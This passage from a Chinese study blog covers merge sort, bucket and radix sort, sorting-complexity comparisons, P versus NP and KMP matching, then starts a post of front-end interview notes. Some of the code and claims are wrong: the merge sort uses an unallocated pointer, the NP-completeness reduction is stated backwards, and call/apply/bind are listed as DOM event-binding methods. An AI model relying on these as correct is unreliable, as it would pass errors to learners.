<h4 id="两路归并的递归算法"><a href="#两路归并的递归算法" class="headerlink" title="两路归并的递归算法"></a>两路归并的递归算法</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> MSort(ElemType *r, ElemType *rf,int s, int t) </span><br><span class="line">&#123; </span><br><span class="line">ElemType *rf2; </span><br><span class="line"><span class="keyword">if</span>(s==t) r[s] = rf[s]; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    int m=(s+t)/<span class="number">2</span>; <span class="comment">/*平分*p 表*/</span> </span><br><span class="line">    MSort(r, rf2, s, m); <span class="comment">/*递归地将p[s…m]归并为有序的p2[s…m]*/</span> </span><br><span class="line">    MSort(r, rf2, m+<span class="number">1</span>, t); <span class="comment">/*递归地将p[m+1…t]归并为有序的p2[m+1…t]*/</span> </span><br><span class="line">    Merge(rf2, rf, s, m+<span class="number">1</span>,t); <span class="comment">/*将p2[s…m]和p2[m+1…t]归并到p1[s…t]*/</span> </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">void</span> MergeSort_recursive(ElemType *r, ElemType *rf, int n) </span><br><span class="line">&#123; <span class="comment">/*对顺序表*p 作归并排序*/</span> </span><br><span class="line">    MSort(r, rf,<span class="number">0</span>, n<span class="number">-1</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="桶排序-基数排序-Radix-Sort"><a href="#桶排序-基数排序-Radix-Sort" class="headerlink" title="桶排序/基数排序(Radix Sort)"></a>桶排序/基数排序(Radix Sort)</h2><h3 id="桶排序"><a href="#桶排序" class="headerlink" title="桶排序"></a>桶排序</h3><h4 id="基本思想-1"><a href="#基本思想-1" class="headerlink" title="基本思想"></a>基本思想</h4><p>是将阵列分到有限数量的桶子里。每个桶子再个别排序（有可能再使用别的排序算法或是以递回方式继续使用桶排序进行排序）。桶排序是鸽巢排序的一种归纳结果。当要被排序的阵列内的数值是均匀分配的时候，桶排序使用线性时间（Θ（n））。但桶排序并不是 比较排序，他不受到 O(n log n) 下限的影响。</p>
<p>简单来说，就是把数据分组，放在一个个的桶中，然后对每个桶里面的在进行排序。</p>
<p>例如要对大小为[1..1000]范围内的n个整数A[1..n]排序</p>
<p>首先，可以把桶设为大小为10的范围，具体而言，设集合B[1]存储[1..10]的整数，集合B[2]存储 (10..20]的整数，……集合B[i]存储( (i-1)<em>10, i</em>10]的整数，i = 1,2,..100。总共有 100个桶。</p>
<p>然后，对A[1..n]从头到尾扫描一遍，把每个A[i]放入对应的桶B[j]中。 再对这100个桶中每个桶里的数字排序，这时可用冒泡，选择，乃至快排，一般来说任 何排序法都可以。</p>
<p>最后，依次输出每个桶里面的数字，且每个桶中的数字从小到大输出，这 样就得到所有数字排好序的一个序列了。</p>
<p>假设有n个数字，有m个桶，如果数字是平均分布的，则每个桶里面平均有n/m个数字。如果对每个桶中的数字采用快速排序，那么整个算法的复杂度是 O(n + m <em> n/m</em>log(n/m)) = O(n + nlogn - nlogm) 从上式看出，当m接近n的时候，桶排序复杂度接近O(n)</p>
<p>当然，以上复杂度的计算是基于输入的n个数字是平均分布这个假设的。这个假设是很强的 ，实际应用中效果并没有这么好。如果所有的数字都落在同一个桶中，那就退化成一般的排序了。</p>
<p>前面说的几大排序算法 ，大部分时间复杂度都是O（n2），也有部分排序算法时间复杂度是O(nlogn)。而桶式排序却能实现O（n）的时间复杂度。</p>
<p>但桶排序的缺点是：</p>
<p>1）首先是空间复杂度比较高，需要的额外开销大。排序有两个数组的空间开销，一个存放待排序数组，一个就是所谓的桶，比如待排序值是从0到m-1，那就需要m个桶，这个桶数组就要至少m个空间。</p>
<p>2）其次待排序的元素都要在一定的范围内等等。</p>
<p>桶式排序是一种分配排序。分配排序的特定是不需要进行关键码的比较，但前提是要知道待排序列的一些具体情况。</p>
<p>分配排序的基本思想：说白了就是进行多次的桶式排序。</p>
<p>基数排序过程无须比较关键字，而是通过“分配”和“收集”过程来实现排序。它们的时间复杂度可达到线性阶：O(n)。</p>
<p>实例:</p>
<p>扑克牌中52 张牌，可按花色和面值分成两个字段，其大小关系为：<br> <img src="/study/2018/9/8-sort/tong_sort_1.png"><br>若对扑克牌按花色、面值进行升序排序，得到如下序列：<br> <img src="/study/2018/9/8-sort/tong_sort_2.png"></p>
<p>即两张牌，若花色不同，不论面值怎样，花色低的那张牌小于花色高的，只有在同花色情况下，大小关系才由面值的大小确定。这就是多关键码排序。</p>
<p>为得到排序结果，我们讨论两种排序方法。</p>
<p>方法1：先对花色排序，将其分为4 个组，即梅花组、方块组、红心组、黑心组。再对每个组分别按面值进行排序，最后，将4 个组连接起来即可。</p>
<p>方法2：先按13 个面值给出13 个编号组(2 号，3 号，…，A 号)，将牌按面值依次放入对应的编号组，分成13 堆。再按花色给出4 个编号组(梅花、方块、红心、黑心)，将2号组中牌取出分别放入对应花色组，再将3 号组中牌取出分别放入对应花色组，……，这样，4 个花色组中均按面值有序，然后，将4 个花色组依次连接起来即可。</p>
<p>设n 个元素的待排序列包含d 个关键码{k1，k2，…，kd}，则称序列对关键码{k1，k2，…，kd}有序是指：对于序列中任两个记录r[i]和r<a href="1≤i≤j≤n">j</a>都满足下列有序关系：</p>
<p>其中k1 称为最主位关键码，kd 称为最次位关键码 。</p>
<h4 id="两种多关键码排序方法："><a href="#两种多关键码排序方法：" class="headerlink" title="两种多关键码排序方法："></a>两种多关键码排序方法：</h4><p>多关键码排序按照从最主位关键码到最次位关键码或从最次位到最主位关键码的顺序逐次排序，分两种方法：</p>
<p>最高位优先(Most Significant Digit first)法，简称MSD 法：</p>
<p>1）先按k1 排序分组，将序列分成若干子序列，同一组序列的记录中，关键码k1 相等。</p>
<p>2）再对各组按k2 排序分成子组，之后，对后面的关键码继续这样的排序分组，直到按最次位关键码kd 对各子组排序后。</p>
<p>3）再将各组连接起来，便得到一个有序序列。扑克牌按花色、面值排序中介绍的方法一即是MSD 法。</p>
<p>最低位优先(Least Significant Digit first)法，简称LSD 法：</p>
<p>1) 先从kd 开始排序，再对kd-1进行排序，依次重复，直到按k1排序分组分成最小的子序列后。</p>
<p>2) 最后将各个子序列连接起来，便可得到一个有序的序列, 扑克牌按花色、面值排序中介绍的方法二即是LSD 法。</p>
<h4 id="基于LSD方法的链式基数排序的基本思想"><a href="#基于LSD方法的链式基数排序的基本思想" class="headerlink" title="基于LSD方法的链式基数排序的基本思想"></a>基于LSD方法的链式基数排序的基本思想</h4><p>“多关键字排序”的思想实现“单关键字排序”。对数字型或字符型的单关键字，可以看作由多个数位或多个字符构成的多关键字，此时可以采用“分配-收集”的方法进行排序，这一过程称作基数排序法，其中每个数字或字符可能的取值个数称为基数。比如，扑克牌的花色基数为4，面值基数为13。在整理扑克牌时，既可以先按花色整理，也可以先按面值整理。按花色整理时，先按红、黑、方、花的顺序分成4摞（分配），再按此顺序再叠放在一起（收集），然后按面值的顺序分成13摞（分配），再按此顺序叠放在一起（收集），如此进行二次分配和收集即可将扑克牌排列有序。</p>
<h2 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序:"></a>基数排序:</h2><p>O(d(n+r)，其中：d为待排列数字的最大位数，n为待排序列的长度，r为进制数 </p>
<p>是按照低位先排序，然后收集；再按照高位排序，然后再收集；依次类推，直到最高位。有时候有些属性是有优先级顺序的，先按低优先级排序，再按高优先级排序。最后的次序就是高优先级高的在前，高优先级相同的低优先级高的在前。基数排序基于分别排序，分别收集，所以是稳定的。</p>
<h4 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">// 第一步</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">0 90 100</span></span><br><span class="line"><span class="comment">1 </span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">3</span></span><br><span class="line"><span class="comment">4</span></span><br><span class="line"><span class="comment">5 15 75</span></span><br><span class="line"><span class="comment">6 46</span></span><br><span class="line"><span class="comment">7 37</span></span><br><span class="line"><span class="comment">8 48</span></span><br><span class="line"><span class="comment">9 99</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">=&gt; 90 100 15 75 46 37 48 99</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">// 第二步</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">0 100</span></span><br><span class="line"><span class="comment">1 15</span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">3 37</span></span><br><span class="line"><span class="comment">4 46 48</span></span><br><span class="line"><span class="comment">5</span></span><br><span class="line"><span class="comment">6</span></span><br><span class="line"><span class="comment">7 75</span></span><br><span class="line"><span class="comment">8</span></span><br><span class="line"><span class="comment">9 90 99</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">=&gt; 100 15 37 46 48 75 90 99</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">// 第三步</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">0 15 37 46 48 75 90 99</span></span><br><span class="line"><span class="comment">1 100 </span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">3</span></span><br><span class="line"><span class="comment">4</span></span><br><span class="line"><span class="comment">5</span></span><br><span class="line"><span class="comment">6</span></span><br><span class="line"><span class="comment">7</span></span><br><span class="line"><span class="comment">8</span></span><br><span class="line"><span class="comment">9</span></span><br><span class="line"><span class="comment">=&gt; 15 37 46 48 75 90 99 100</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> counter = [];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">radixSort</span>(<span class="params">arr, maxDigit</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> mod = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">var</span> dev = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; maxDigit; i++, dev *= <span class="number">10</span>, mod *= <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; arr.length; j++) &#123;</span><br><span class="line">            <span class="keyword">var</span> bucket = <span class="built_in">parseInt</span>((arr[j] % mod) / dev);</span><br><span class="line">            <span class="keyword">if</span>(counter[bucket]==<span class="literal">null</span>) &#123;</span><br><span class="line">                counter[bucket] = [];</span><br><span class="line">            &#125;</span><br><span class="line">            counter[bucket].push(arr[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//按照bucket的 顺序写入数组</span></span><br><span class="line">        <span class="keyword">var</span> pos = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; counter.length; j++) &#123;</span><br><span class="line">            <span class="keyword">var</span> value = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span>(counter[j]!=<span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span> ((value = counter[j].shift()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                      arr[pos++] = value;</span><br><span class="line">                &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2> <img src="/study/2018/9/8-sort/all_sort.png">
<p>各种排序的稳定性，时间复杂度和空间复杂度总结：</p>
<h4 id="时间复杂度来说："><a href="#时间复杂度来说：" class="headerlink" title="时间复杂度来说："></a>时间复杂度来说：</h4><p>(1)平方阶(O(n2))排序<br>各类简单排序:直接插入、直接选择和冒泡排序；</p>
<p>(2)线性对数阶(O(nlog2n))排序<br>快速排序、堆排序和归并排序；</p>
<p>(3)O(n1+§))排序,§是介于0和1之间的常数。<br>希尔排序</p>
<p>(4)线性阶(O(n))排序<br>基数排序，此外还有桶、箱排序。</p>
<p>说明：</p>
<p>当原表有序或基本有序时，直接插入排序和冒泡排序将大大减少比较次数和移动记录的次数，时间复杂度可降至O（n）；</p>
<p>而快速排序则相反，当原表基本有序时，将蜕化为冒泡排序，时间复杂度提高为O（n2）；</p>
<p>原表是否有序，对简单选择排序、堆排序、归并排序和基数排序的时间复杂度影响不大。</p>
<h4 id="稳定性："><a href="#稳定性：" class="headerlink" title="稳定性："></a>稳定性：</h4><p>排序算法的稳定性:若待排序的序列中，存在多个具有相同关键字的记录，经过排序， 这些记录的相对次序保持不变，则称该算法是稳定的；若经排序后，记录的相对 次序发生了改变，则称该算法是不稳定的。</p>
<p>稳定性的好处：排序算法如果是稳定的，那么从一个键上排序，然后再从另一个键上排序，第一个键排序的结果可以为第二个键排序所用。基数排序就是这样，先按低位排序，逐次按高位排序，低位相同的元素其顺序再高位也相同时是不会改变的。另外，如果排序算法稳定，可以避免多余的比较；</p>
<p><strong>稳定的排序算法：冒泡排序、插入排序、归并排序和基数排序</strong></p>
<p><strong>不是稳定的排序算法：选择排序、快速排序、希尔排序、堆排序</strong></p>
<h4 id="选择排序算法准则："><a href="#选择排序算法准则：" class="headerlink" title="选择排序算法准则："></a>选择排序算法准则：</h4><p>每种排序算法都各有优缺点。因此，在实用时需根据不同情况适当选用，甚至可以将多种方法结合起来使用。</p>
<p>选择排序算法的依据</p>
<p>影响排序的因素有很多，平均时间复杂度低的算法并不一定就是最优的。相反，有时平均时间复杂度高的算法可能更适合某些特殊情况。同时，选择算法时还得考虑它的可读性，以利于软件的维护。一般而言，需要考虑的因素有以下四点：</p>
<p>1.待排序的记录数目n的大小；<br>2.记录本身数据量的大小，也就是记录中除关键字外的其他信息量的大小；<br>3.关键字的结构及其分布情况；<br>4.对排序稳定性的要求。</p>
<p>设待排序元素的个数为n.</p>
<p>1）当n较大，则应采用时间复杂度为O(nlog2n)的排序方法：快速排序、堆排序或归并排序序。<br>快速排序：是目前基于比较的内部排序中被认为是最好的方法，当待排序的关键字是随机分布时，快速排序的平均时间最短；<br>堆排序：如果内存空间允许且要求稳定性的，<br>归并排序：它有一定数量的数据移动，所以我们可能过与插入排序组合，先获得一定长度的序列，然后再合并，在效率上将有所提高。</p>
<p>2）当n较大，内存空间允许，且要求稳定性 =》归并排序</p>
<p>3）当n较小，可采用直接插入或直接选择排序。<br>直接插入排序：当元素分布有序，直接插入排序将大大减少比较次数和移动记录的次数。<br>直接选择排序：元素分布有序，如果不要求稳定性，选择直接选择排序</p>
<p>5）一般不使用或不直接使用传统的冒泡排序。</p>
<p>6）基数排序<br>它是一种稳定的排序算法，但有一定的局限性：</p>
<p>1、关键字可分解。<br>2、记录的关键字位数较少，如果密集更好<br>3、如果是数字时，最好是无符号的，否则将增加相应的映射复杂度，可先将其正负分开排序。</p>
<h2 id="P问题"><a href="#P问题" class="headerlink" title="P问题"></a>P问题</h2><p>P是一个判定问题类,这些问题可以用一个确定性算法在多项式时间内判定或解出。如果一个判定性问题的复杂度是该问题的一个实例的规模n的多项式函数，则我们说这种可以在多项式时间内解决的判定性问题属于P类问题。P类问题就是所有复杂度为多项式时间的问题的集合。<br>NP是一个判定问题类,这些问题可以用一个确定算法在多项式时间内检查或验证出它们的解;P事实上很直观,我们通常在编程中求解的问题大多都是P类问题.比如说排序,找最短路径等.<br>2、NP问题 然而有些问题很难找到多项式时间的算法（或许根本不存在），比如找出无向图中的哈米尔顿回路问题，但是我们发现如果给了我们该问题的一个答案，我们可以在多项式时间内判断这个答案是否正确。比如说对于哈米尔顿回路问题，给一个任意的回路，我们很容易判断他是否是哈米尔顿回路（只要看是不是所有的顶点都在回路中就可以了）。这种可以在多项式时间内验证一个解是否正确的问题称为NP问题。显然，所有的P类问题都是属于NP问题的，但是现在的问题是，P是否等于NP?这个问题至今还未解决。<br>NP这个类事实上也很有趣,它并不要求给出一个算法来求解问题本身,而只是要求给出一个确定性算法在多项式时间内验证它的解.<br>3、NP完全问题 此外请注意，NP问题不一定都是难解的问题，比如，简单的数组排序问题是P类问题，但是P属于NP，所以也是NP问题，你能说他很难解么？刚才说了，现在还不知道是否有P=NP或者P&lt;&gt;NP，但是后来人们发现还有一系列的特殊NP问题，这类问题的特殊性质使得很多人相信P&lt;&gt;NP，只不过现在还无法证明。这类特殊的NP问题就是NP完全问题（NPC问题，C代表complete）。 NP完全问题是求NP中判定问题的一个子类.NPC问题存在着一个令人惊讶的性质，即如果一个NPC问题存在多项式时间的算法，则所有的NP问题都可以在多项式时间内求解，即P=NP成立！！这是因为，每一个NPC问题可以在多项式时间内转化成任何一个NP问题。比如前面说的哈米尔顿回路问题就是一个NPC问题。NPC问题的历史并不久，cook在1971年找到了第一个NPC问题，此后人们又陆续发现很多NPC问题，现在可能已经有3000多个了。所以，我们一般认为NPC问题是难解的问题，因为他不太可能存在一个多项式时间的算法（如果存在则所有的NP问题都存在多项式时间算法，这太不可思议了，但是也不是不可能）。类似哈米尔顿回路/路径问题，货郎担问题，集团问题，最小边覆盖问题（注意和路径覆盖的区别），等等很多问题都是NPC问题，所以都是难解的问题。</p>
<h2 id="KMP"><a href="#KMP" class="headerlink" title="KMP"></a>KMP</h2><p>手算KMP匹配的Next值和Nextval值<br><a href="https://www.slyar.com/blog/kmp-next-nextval.html" target="_blank" rel="noopener">https://www.slyar.com/blog/kmp-next-nextval.html</a><br><a href="http://blog.csdn.net/yutianzuijin/article/details/11954939" target="_blank" rel="noopener">http://blog.csdn.net/yutianzuijin/article/details</a></p>
<p>字符串f每一个位置的最大公共长度。这个最大公共长度在算法导论里面被记为next数组。假设我们现在已经求得next[1]、next[2]、……next[i]，分别表示长度为1到i的字符串的前缀和后缀最大公共长度，现在要求next[i+1]。由上图我们可以看到，<br>1、如果位置i和位置next[i]处的两个字符相同（下标从零开始），则next[i+1]等于next[i]加1<br>2、如果两个位置的字符不相同，我们可以将长度为next[i]的字符串继续分割，获得其最大公共长度next[next[i]]，然后再和位置i的字符比较。如果位置next[next[i]]和位置i的字符相同，则next[i+1]就等于next[next[i]]加1。如果不相等，就可以继续分割长度为next[next[i]]的字符串，直到字符串长度为0为止<br> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> getNext(char*t)</span><br><span class="line">&#123;</span><br><span class="line">    int i=<span class="number">0</span>;</span><br><span class="line">    int j=<span class="number">-1</span>;</span><br><span class="line">    next[i]=<span class="number">-1</span>;</span><br><span class="line">    int lent=strlen(t);</span><br><span class="line">    <span class="keyword">while</span>(i&lt;lent)&#123;</span><br><span class="line">        <span class="keyword">if</span>(j==<span class="number">-1</span>||t[i]==t[j])&#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">            next[i]=j;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> j=next[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int kmp(char*s,char*t)&#123;</span><br><span class="line">    int lens=strlen(s);</span><br><span class="line">    int lent=strlen(t);</span><br><span class="line">    getNext (t);</span><br><span class="line">    int i=<span class="number">-1</span>,j=<span class="number">-1</span>;</span><br><span class="line">    int cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;lens)&#123;</span><br><span class="line">        <span class="keyword">if</span>(j==<span class="number">-1</span>||t[j]==s[i]) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// 如果第i+1个位置不同，则出现不匹配，我们依旧要将长度为j的字符串分割，获得其最大公共长度next[j]，然后从next[j]继续比较两个字符串</span></span><br><span class="line">        <span class="keyword">else</span> j=next[j];。</span><br><span class="line">        <span class="keyword">if</span>(j==lent)&#123;</span><br><span class="line">            j--;</span><br><span class="line">            i--;</span><br><span class="line">            j=next[j];</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cnt;<span class="comment">//s中有cnt 个t子串</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/学习/">学习</a>►<a class="article-category-link" href="/categories/学习/专题笔记/">专题笔记</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/面试/">面试</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/study/2018/9/mianjing.html" title="面经收集--HTML+CSS+JS" itemprop="url">面经收集--HTML+CSS+JS</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="Ruiyu Lin" target="_blank" itemprop="author">Ruiyu Lin</a>
		
  <p class="article-time">
    <time datetime="2018-10-07T16:00:00.000Z" itemprop="datePublished"> Published 2018-10-08</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p><a href="https://segmentfault.com/a/1190000011635556?utm_source=tag-newest" target="_blank" rel="noopener">https://segmentfault.com/a/1190000011635556?utm_source=tag-newest</a></p>
<h4 id="本质上说，XHTML是一个过渡技术，结合了XML-有几分-的强大功能及HTML-大多数-的简单特性。"><a href="#本质上说，XHTML是一个过渡技术，结合了XML-有几分-的强大功能及HTML-大多数-的简单特性。" class="headerlink" title="本质上说，XHTML是一个过渡技术，结合了XML(有几分)的强大功能及HTML(大多数)的简单特性。"></a>本质上说，XHTML是一个过渡技术，结合了XML(有几分)的强大功能及HTML(大多数)的简单特性。</h4><p>以下是 XHTML 相对 HTML 的几大区别：<br>XHTML 要求正确嵌套、<br>XHTML 所有元素必须关闭、<br>XHTML 区分大小写、<br>XHTML 属性值要用双引号、<br>XHTML 用 id 属性代替 name 属性、<br>XHTML 特殊字符的处理</p>
<h4 id="table布局应用场景："><a href="#table布局应用场景：" class="headerlink" title="table布局应用场景："></a>table布局应用场景：</h4><p>同行等高、<br>宽度自动调节</p>
<h4 id="BFC"><a href="#BFC" class="headerlink" title="BFC"></a>BFC</h4><p>(Block formatting context)直译为”块级格式化上下文”。它是一个独立的渲染区域，只有Block-level box参与， 它规定了内部的Block-level Box如何布局，并且与这个区域外部毫不相干。</p>
<p>哪些元素会生成BFC?</p>
<ol>
<li>根元素</li>
<li>float属性不为none</li>
<li>position为absolute或fixed</li>
<li>display为inline-block, table-cell, table-caption, flex, inline-flex</li>
<li>overflow不为visible<br><a href="http://www.cnblogs.com/lhb25/p/inside-block-formatting-ontext.html" target="_blank" rel="noopener">http://www.cnblogs.com/lhb25/p/inside-block-formatting-ontext.html</a></li>
</ol>
<h4 id="你知道attribute和property的区别么"><a href="#你知道attribute和property的区别么" class="headerlink" title="你知道attribute和property的区别么"></a>你知道attribute和property的区别么</h4><p>DOM有其默认的基本属性，而这些属性就是所谓的“property”.<br>property能够从attribute中得到同步；<br>attribute不会同步property上的值；<br>attribute和property之间的数据绑定是单向的，attribute-&gt;property；</p>
<h4 id="流式布局如何实现，响应式布局如何实现"><a href="#流式布局如何实现，响应式布局如何实现" class="headerlink" title="流式布局如何实现，响应式布局如何实现"></a>流式布局如何实现，响应式布局如何实现</h4><p><a href="https://www.cnblogs.com/yanayana/p/7066948.html" target="_blank" rel="noopener">https://www.cnblogs.com/yanayana/p/7066948.html</a></p>
<h4 id="实现两栏布局有哪些方法？"><a href="#实现两栏布局有哪些方法？" class="headerlink" title="实现两栏布局有哪些方法？"></a>实现两栏布局有哪些方法？</h4><p><a href="https://segmentfault.com/a/1190000010698609" target="_blank" rel="noopener">https://segmentfault.com/a/1190000010698609</a></p>
<h4 id="实现三栏布局（圣杯布局，双飞翼布局，flex布局）"><a href="#实现三栏布局（圣杯布局，双飞翼布局，flex布局）" class="headerlink" title="实现三栏布局（圣杯布局，双飞翼布局，flex布局）"></a>实现三栏布局（圣杯布局，双飞翼布局，flex布局）</h4><p><a href="https://blog.csdn.net/wangchengiii/article/details/77926868" target="_blank" rel="noopener">https://blog.csdn.net/wangchengiii/article/details/77926868</a></p>
<h4 id="padding-top、margin-top…等四个方向的值取决于父元素的宽，和父元素的高没有一点关系"><a href="#padding-top、margin-top…等四个方向的值取决于父元素的宽，和父元素的高没有一点关系" class="headerlink" title="padding-top、margin-top…等四个方向的值取决于父元素的宽，和父元素的高没有一点关系"></a>padding-top、margin-top…等四个方向的值取决于父元素的<strong>宽</strong>，和父元素的高没有一点关系</h4><h4 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h4><p>至于bind方法，他是直接改变这个函数的this指向并且返回一个新的函数，之后再次调用这个函数的时候this都是指向bind绑定的第一个参数。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> test2 = dog.eatBone.bind(cat, <span class="string">'喵喵喵'</span>, <span class="string">'bind'</span>)</span><br><span class="line">test2()</span><br></pre></td></tr></table></figure></p>
<h4 id="new-一个对象具体做了什么"><a href="#new-一个对象具体做了什么" class="headerlink" title="new 一个对象具体做了什么"></a>new 一个对象具体做了什么</h4><p>(1) 创建一个新对象；<br>(2)新对象的<em>proto</em>属性指向构造函数的原型对象。<br>(3) 将构造函数的作用域赋给新对象（因此 this 就指向了这个新对象） ；<br>(4) 执行构造函数中的代码（为这个新对象添加属性） ；<br>(5) 返回新对象。</p>
<h4 id="DOM事件的绑定的几种方式"><a href="#DOM事件的绑定的几种方式" class="headerlink" title="DOM事件的绑定的几种方式"></a>DOM事件的绑定的几种方式</h4><p>call,apply,bind</p>
<h4 id="显示原型prototye和隐式原型proto，手绘原型链"><a href="#显示原型prototye和隐式原型proto，手绘原型链" class="headerlink" title="显示原型prototye和隐式原型proto，手绘原型链."></a>显示原型prototye和隐式原型<em>proto</em>，手绘原型链.</h4><p>每一个函数在创建之后都会拥有一个名为prototype的属性，这个属性指向函数的原型对象。<br>Note：通过Function.prototype.bind方法构造出来的函数是个例外，它没有prototype属性。</p>
<p>JavaScript中任意对象都有一个内置属性[[prototype]]，在ES5之前没有标准的方法访问这个内置属性，但是大多数浏览器都支持通过<strong>proto</strong>来访问。ES5中有了对于这个内置属性标准的Get方法Object.getPrototypeOf().<br>Note: Object.prototype 这个对象是个例外，它的<strong>proto</strong>值为null</p>
<blockquote>
<p>隐式原型指向这个对象的构造函数(constructor)的prototype</p>
</blockquote>
<p>隐式原型的作用：<strong>构成原型链</strong>。举个例子，当我们访问obj这个对象中的x属性时，如果在obj中找不到，那么就会沿着<strong>proto</strong>依次查找。</p>
